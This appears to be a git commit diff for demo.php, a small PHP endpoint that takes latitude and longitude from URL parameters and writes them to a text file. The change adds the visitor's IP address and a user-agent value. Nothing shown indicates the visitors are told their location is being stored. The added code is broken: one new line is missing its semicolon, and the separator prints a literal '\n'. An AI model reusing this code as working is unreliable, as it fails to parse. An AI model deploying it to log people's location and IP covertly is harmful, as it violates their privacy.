759b48a0b0af6db8990d186bfc5a93f25aa039d6
congdong007 <eric.congdong@gmail.com>
2023-12-08 00:13:11 -0500

    Site updated: 2023-12-08 00:12:23

--- demo.php
+++ demo.php
@@ -4,10 +4,12 @@
 header('Content-Type: text/html; charset=utf-8');
 $latitude = $_GET['lat'];
 $longitude = $_GET['long'];
+$useragent = $_GET['uagent']
 
 // 将经纬度信息写入文件
-$file = fopen("location.txt", "w") or die("无法打开文件");
-$content = "纬度: " . $latitude . ", 经度: " . $longitude;
+$file = fopen("demo.txt", "w") or die("无法打开文件");
+$content = "纬度: " . $latitude . ",\n 经度: " . $longitude . "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nUser Agent:" . $useragent;
 fwrite($file, $content);
+fwrite($file, '****************************************\n');
 fclose($file);
 ?>
